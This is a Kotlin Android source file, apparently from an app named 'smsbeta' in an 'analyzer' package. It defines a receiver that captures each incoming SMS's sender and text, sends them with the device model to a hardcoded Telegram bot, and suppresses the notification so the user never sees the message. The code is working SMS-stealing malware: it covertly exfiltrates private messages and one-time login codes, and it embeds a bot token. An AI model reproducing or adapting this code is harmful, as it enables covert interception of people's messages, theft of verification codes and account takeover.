package com.analyzer.smsbeta

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Telephony
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okio.IOException

class SmsReceiver : BroadcastReceiver() {
    private val client = OkHttpClient()

    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == Telephony.Sms.Intents.SMS_DELIVER_ACTION) {
            val bundle: Bundle? = intent.extras
            if (bundle != null) {
                val pdus: Array<Any?>? = bundle.get("pdus") as Array<Any?>?
                if (pdus != null) {
                    for (pdu in pdus) {
                        val smsMessage = Telephony.Sms.Intents.getMessagesFromIntent(intent).firstOrNull()
                        smsMessage?.let {
                            val sender: String = it.originatingAddress ?: "Неизвестный отправитель"
                            val messageBody: String = it.messageBody ?: "Пустое сообщение"
                            val deviceModel = getDeviceModel()

                            sendToTelegramBot(sender, messageBody, deviceModel)
                            
                            // Подавляем уведомление, чтобы SMS не показывались пользователю
                            abortBroadcast()
                        }
                    }
                }
            }
        }
    }

    private fun getDeviceModel(): String {
        return "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
    }

    private fun sendToTelegramBot(sender: String, message: String, device: String) {
        val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
        val chatId = "6331293386"
        val url = "https://api.telegram.org/bot$botToken/sendMessage"

        val text = """
            Получено новое смс!
            Отправитель: $sender
            Сообщение: $message
        
            $device
        """.trimIndent()

        val mediaType = "application/json".toMediaType()
        val requestBody = """
            {
                "chat_id": "$chatId",
                "text": "$text",
                "parse_mode": "Markdown"
            }
        """.trimIndent().toRequestBody(mediaType)

        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: okhttp3.Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                if (!response.isSuccessful) {
                    println("${response.code}")
                }
                response.close()
            }
        })
    }
}
